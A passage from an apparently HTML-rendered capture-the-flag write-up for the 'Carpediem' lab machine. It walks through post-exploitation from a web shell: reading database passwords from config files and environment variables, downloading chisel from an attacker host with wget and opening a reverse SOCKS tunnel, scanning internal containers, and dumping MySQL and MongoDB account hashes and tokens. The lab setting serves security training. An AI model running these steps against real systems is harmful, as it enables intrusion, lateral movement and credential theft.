+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@3c371615b7aa:/var/www/html/portal/uploads$</span> id <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="ex">3c371615b7aa</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-3" class="level3">
+<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
+<p>Enumerate the victim machine and we can start by looking for SQL credentials.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@3c371615b7aa:/var/www/html/portal/classes$</span> cat DBConnection.php</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="ex">?php</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span><span class="kw">(</span><span class="ex">!defined</span><span class="er">(</span><span class="st">'DB_SERVER'</span><span class="kw">)){</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">require_once</span><span class="er">(</span><span class="st">"../initialize.php"</span><span class="kw">);</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="ex">class</span> DBConnection{</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">private</span> <span class="va">$host</span> = <span class="st">'mysql'</span><span class="kw">;</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">private</span> <span class="va">$username</span> = <span class="st">'portaldb'</span><span class="kw">;</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">private</span> <span class="va">$password</span> = <span class="st">'J5tnqsXpyzkK4XNt'</span><span class="kw">;</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">private</span> <span class="va">$database</span> = <span class="st">'portal'</span><span class="kw">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Looking around further we can see we’re in a container. Upload <code>deepce.sh</code> to enumerate and it gives little to no info..</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@3c371615b7aa:/dev/shm$</span> bash deepce.sh</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Inside Container ........ Yes</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Container Platform ...... docker</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Container tools ......... None</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Docker Version .......... Version Unknown</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Dangerous Capabilities .. Unknown <span class="er">(</span><span class="ex">capsh</span> not installed<span class="kw">)</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Privileged Mode ......... Unknown</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Useful tools installed .. Yes</span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/curl</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/wget</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/gcc</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="ex">/bin/hostname</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/python3</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>In <code>env</code> we find additional credentials:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@3c371615b7aa:/$</span> ./usr/bin/env</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="va">MYSQL_PORT_33060_TCP_ADDR</span><span class="op">=</span>172.17.0.3</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="va">MYSQL_PORT</span><span class="op">=</span>tcp://172.17.0.3:3306</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="va">MYSQL_PORT_3306_TCP_ADDR</span><span class="op">=</span>172.17.0.3</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="va">MYSQL_NAME</span><span class="op">=</span>/portal/mysql</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="va">MYSQL_ENV_MYSQL_ROOT_PASSWORD</span><span class="op">=</span>3dQXeqjMHnq4kqDv</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="va">MYSQL_PORT_3306_TCP_PORT</span><span class="op">=</span>3306</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Upload <code>chisel</code> to the docker and setup a tunnel so we can use proxychains and reach <code>172.17.0.3:3306</code> Note that I wasn’t able to execute the binary in <code>/dev/shm</code> and had to move to <code>/tmp</code></p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Setup chisel server locally</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem cat /etc/proxychains4.conf</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="ex">socks5</span>  127.0.0.1 5000</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server <span class="at">-p</span> 4444 <span class="at">--reverse</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="co">## Connect with chisel client from victim</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@3c371615b7aa:/dev/shm$</span> wget http://10.10.14.10/chisel_1.7.7_linux_amd64</span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@3c371615b7aa:/dev/shm$</span> chmod +x chisel_1.7.7_linux_amd64</span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@3c371615b7aa:/tmp$</span> ./chisel_1.7.7_linux_amd64 client 10.10.14.10:4444 R:5000:socks</span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="co">## Verify connection with nmap</span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem proxychains nmap <span class="at">-sT</span> <span class="at">--top-port</span> 25 <span class="at">--open</span> 172.17.0.3</span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE</span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a><span class="ex">3306/tcp</span> open  mysql</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Login to the MySQL database and try to extract valuable information:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem proxychains mysql <span class="at">-h</span> 172.17.0.3 <span class="at">-D</span> portal <span class="at">-u</span> portaldb <span class="at">-p</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> password: J5tnqsXpyzkK4XNt</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="ex">MySQL</span> <span class="pp">[</span><span class="ss">portal</span><span class="pp">]</span><span class="op">&gt;</span> show tables<span class="kw">;</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="ex">+------------------+</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Tables_in_portal</span> <span class="kw">|</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="ex">+------------------+</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">bike_list</span>        <span class="kw">|</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">brand_list</span>       <span class="kw">|</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">categories</span>       <span class="kw">|</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">file_list</span>        <span class="kw">|</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">rent_list</span>        <span class="kw">|</span></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">system_info</span>      <span class="kw">|</span></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">users</span>            <span class="kw">|</span></span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a><span class="ex">+------------------+</span></span>
+<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a><span class="ex">MySQL</span> <span class="pp">[</span><span class="ss">portal</span><span class="pp">]</span><span class="op">&gt;</span> select <span class="pp">*</span> from users where username = <span class="st">'admin'</span><span class="kw">;</span></span>
+<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+</span></span>
+<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">id</span> <span class="kw">|</span> <span class="ex">firstname</span> <span class="kw">|</span> <span class="ex">lastname</span> <span class="kw">|</span> <span class="ex">gender</span> <span class="kw">|</span> <span class="ex">contact</span>                <span class="kw">|</span> <span class="ex">username</span> <span class="kw">|</span> <span class="ex">password</span>                         <span class="kw">|</span> <span class="ex">address</span> <span class="kw">|</span> <span class="ex">avatar</span>                            <span class="kw">|</span> <span class="ex">last_login</span> <span class="kw">|</span> <span class="ex">login_type</span> <span class="kw">|</span> <span class="ex">date_added</span>          <span class="kw">|</span> <span class="ex">date_updated</span>        <span class="kw">|</span></span>
+<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+</span></span>
+<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>  <span class="ex">1</span> <span class="kw">|</span> <span class="ex">Jeremy</span>    <span class="kw">|</span> <span class="ex">Hammond</span>  <span class="kw">|</span> <span class="ex">Male</span>   <span class="kw">|</span> <span class="ex">jhammond@carpediem.htb</span> <span class="kw">|</span> <span class="ex">admin</span>    <span class="kw">|</span> <span class="ex">b723e511b084ab84b44235d82da572f3</span> <span class="kw">|</span>         <span class="kw">|</span> <span class="ex">uploads/1635793020_HONDA_XADV.png</span> <span class="kw">|</span> <span class="ex">NULL</span>       <span class="kw">|</span>          <span class="ex">1</span> <span class="kw">|</span> <span class="ex">2021-01-20</span> 14:02:37 <span class="kw">|</span> <span class="ex">2022-04-01</span> 23:34:50 <span class="kw">|</span></span>
+<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Unfortunately we’re not able to crack the hash using hashcat.</p>
+<p>Lets test the other set of credentials found in <code>/usr/bin/env</code>, we don’t have a username so I’m guessing it’s default <code>root</code>:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem proxychains mysql <span class="at">-h</span> 172.17.0.3 <span class="at">-P</span> 3306 <span class="at">-u</span> root <span class="at">-p</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> password: 3dQXeqjMHnq4kqDv</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ex">MySQL</span> [<span class="er">(</span><span class="ex">none</span><span class="kw">)</span><span class="ex">]</span><span class="op">&gt;</span> show databases<span class="kw">;</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ex">+--------------------+</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Database</span>           <span class="kw">|</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="ex">+--------------------+</span></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">information_schema</span> <span class="kw">|</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">mysql</span>              <span class="kw">|</span></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">performance_schema</span> <span class="kw">|</span></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">portal</span>             <span class="kw">|</span></span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">sys</span>                <span class="kw">|</span></span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a><span class="ex">+--------------------+</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We find the same set of databases, so there’s really no need to continue enumerating here.</p>
+</section>
+<section id="step-4" class="level3">
+<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
+<p>Continue to enumerate the surrounding docker addresses for any more hints.</p>
+<p><strong>172.17.0.2:</strong></p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem proxychains nmap <span class="at">-sT</span> <span class="at">--top-port</span><span class="op">=</span>200 <span class="at">--open</span> 172.17.0.2</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>    STATE SERVICE</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="ex">21/tcp</span>  open  ftp</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>  open  http</span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="ex">443/tcp</span> open  https</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Trying to access the FTP server we’re able to login with <code>anonymous:anonymous</code> but we can’t list any content:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem proxychains ftp 172.17.0.2</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ftp</span><span class="op">&gt;</span> dir</span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">500</span> Illegal PORT command.</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="fu">ftp</span><span class="op">&gt;</span> pass</span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Passive</span> mode: on<span class="kw">;</span> <span class="ex">fallback</span> to active mode: on.</span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="fu">ftp</span><span class="op">&gt;</span> dir</span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a><span class="ex">227</span> Entering Passive Mode <span class="er">(</span><span class="ex">172,17,0,2,31,233</span><span class="kw">)</span><span class="bu">.</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[proxychains]</span> Strict chain  ...  127.0.0.1:5000  ...  172.17.0.2:8169  ...  OK</span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a><span class="ex">150</span> Here comes the directory listing.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><strong>172.17.0.4:</strong></p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem proxychains nmap <span class="at">-sT</span> <span class="at">--open</span> 172.17.0.4</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">N/A</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem proxychains nmap <span class="at">-sT</span> <span class="at">--top-port</span><span class="op">=</span>5000 <span class="at">--open</span> 172.17.0.4</span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>      STATE SERVICE</span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="ex">27017/tcp</span> open  mongod</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem proxychains mongo 172.17.0.4 </span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> show <span class="ex">databases</span><span class="kw">;</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="ex">admin</span>    0.000GB</span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ex">config</span>   0.000GB</span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="bu">local</span>    0.000GB</span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a><span class="ex">trudesk</span>  0.001GB</span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> use <span class="ex">trudesk</span><span class="kw">;</span></span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a><span class="ex">switched</span> to db trudesk</span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> show <span class="ex">tables</span><span class="kw">;</span></span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a><span class="ex">accounts</span></span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a><span class="ex">counters</span></span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a><span class="ex">departments</span></span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a><span class="fu">groups</span></span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a><span class="ex">messages</span></span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a><span class="ex">notifications</span></span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a><span class="ex">priorities</span></span>
+<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a><span class="ex">role_order</span></span>
+<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a><span class="ex">roles</span></span>
+<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a><span class="ex">sessions</span></span>
+<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a><span class="ex">settings</span></span>
+<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a><span class="ex">tags</span></span>
+<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a><span class="ex">teams</span></span>
+<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a><span class="ex">templates</span></span>
+<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a><span class="ex">tickets</span></span>
+<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a><span class="ex">tickettypes</span></span>
+<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> db.accounts.find<span class="kw">()</span></span>
+<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span> <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"623c8b20855cc5001a8ba13c"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"preferences"</span> : { <span class="st">"tourCompleted"</span> : false, <span class="st">"autoRefreshTicketGrid"</span> : true, <span class="st">"openChatWindows"</span> : [ ] }, <span class="st">"hasL2Auth"</span> : false, <span class="st">"deleted"</span> : false, <span class="st">"username"</span> : <span class="st">"admin"</span>, <span class="st">"password"</span> : <span class="st">"</span><span class="va">$2</span><span class="st">b</span><span class="va">$1</span><span class="st">0</span><span class="va">$imwoLPu0Au8LjNr08GXGy</span><span class="st">.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS"</span>, <span class="st">"fullname"</span> : <span class="st">"Robert Frost"</span>, <span class="st">"email"</span> : <span class="st">"rfrost@carpediem.htb"</span>, <span class="st">"role"</span> : ObjectId<span class="er">(</span><span class="st">"623c8b20855cc5001a8ba138"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"title"</span> : <span class="st">"Sr. Network Engineer"</span>, <span class="st">"accessToken"</span> : <span class="st">"22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span>, <span class="st">"__v"</span> : 0, <span class="st">"lastOnline"</span> : ISODate<span class="er">(</span><span class="st">"2022-04-07T20:30:32.198Z"</span><span class="kw">)</span> <span class="kw">}</span></span>
+<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span> <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"6243c0be1e0d4d001b0740d4"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"preferences"</span> : { <span class="st">"tourCompleted"</span> : false, <span class="st">"autoRefreshTicketGrid"</span> : true, <span class="st">"openChatWindows"</span> : [ ] }, <span class="st">"hasL2Auth"</span> : false, <span class="st">"deleted"</span> : false, <span class="st">"username"</span> : <span class="st">"jhammond"</span>, <span class="st">"email"</span> : <span class="st">"jhammond@carpediem.htb"</span>, <span class="st">"password"</span> : <span class="st">"</span><span class="va">$2</span><span class="st">b</span><span class="va">$1</span><span class="st">0</span><span class="va">$n4yEOTLGA0SuQ</span><span class="st">.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq"</span>, <span class="st">"fullname"</span> : <span class="st">"Jeremy Hammond"</span>, <span class="st">"title"</span> : <span class="st">"Sr. Systems Engineer"</span>, <span class="st">"role"</span> : ObjectId<span class="er">(</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"accessToken"</span> : <span class="st">"a0833d9a06187dfd00d553bd235dfe83e957fd98"</span>, <span class="st">"__v"</span> : 0, <span class="st">"lastOnline"</span> : ISODate<span class="er">(</span><span class="st">"2022-04-01T23:36:55.940Z"</span><span class="kw">)</span> <span class="kw">}</span></span>
+<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span> <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"6243c28f1e0d4d001b0740d6"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"preferences"</span> : { <span class="st">"tourCompleted"</span> : false, <span class="st">"autoRefreshTicketGrid"</span> : true, <span class="st">"openChatWindows"</span> : [ ] }, <span class="st">"hasL2Auth"</span> : false, <span class="st">"deleted"</span> : false, <span class="st">"username"</span> : <span class="st">"jpardella"</span>, <span class="st">"email"</span> : <span class="st">"jpardella@carpediem.htb"</span>, <span class="st">"password"</span> : <span class="st">"</span><span class="va">$2</span><span class="st">b</span><span class="va">$1</span><span class="st">0</span><span class="va">$nNoQGPes116eTUUl</span><span class="st">/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK"</span>, <span class="st">"fullname"</span> : <span class="st">"Joey Pardella"</span>, <span class="st">"title"</span> : <span class="st">"Desktop Support"</span>, <span class="st">"role"</span> : ObjectId<span class="er">(</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"accessToken"</span> : <span class="st">"7c0335559073138d82b64ed7b6c3efae427ece85"</span>, <span class="st">"__v"</span> : 0, <span class="st">"lastOnline"</span> : ISODate<span class="er">(</span><span class="st">"2022-04-07T20:33:20.918Z"</span><span class="kw">)</span> <span class="kw">}</span></span>
